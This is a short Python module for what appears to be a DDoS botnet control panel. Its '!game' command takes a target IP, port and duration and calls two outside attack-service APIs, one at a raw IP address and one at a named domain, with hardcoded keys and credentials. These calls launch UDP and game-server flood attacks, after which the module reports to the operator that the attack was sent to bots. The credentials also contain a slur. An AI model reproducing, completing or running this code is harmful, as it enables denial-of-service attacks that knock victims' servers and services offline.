import requests
from colorama import Fore
import time

last_game_time = 0

def game(args, validate_time, send, client, ansi_clear, broadcast, data):
    global last_game_time
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        time_str = args[3]
        try:
            time_int = int(time_str)
            if time_int > 60:
                send(client, "Your max time is 60 seconds")
                return
            if time.time() - last_game_time < 60:
                send(client, "Your max concurrent is 1")
                return

            res1 = requests.get(f'http://176.97.210.213/api.php?key=sqpenis&host={ip}&port={port}&time={time_str}&method=UDP')
            res2 = requests.get(f'https://cepto.gay/api/attack?username=niggersosi1&password=loxlox&host={ip}&port={port}&time={time_str}&method=GAME')  
            if validate_time(str(time_int)):
                last_game_time = time.time()
                send(client, f"{Fore.WHITE}Attack sent to {Fore.RED}3 {Fore.WHITE}bots - ID: 927832")
                broadcast(data)
            else:
                send(client, Fore.RED + 'Invalid attack duration (1-1200 seconds)')
        except Exception as e:
            send(client, f'Error: {str(e)}')
    else:
        send(client, f'{Fore.WHITE}Usage: !game [IP] [PORT] [TIME]')






















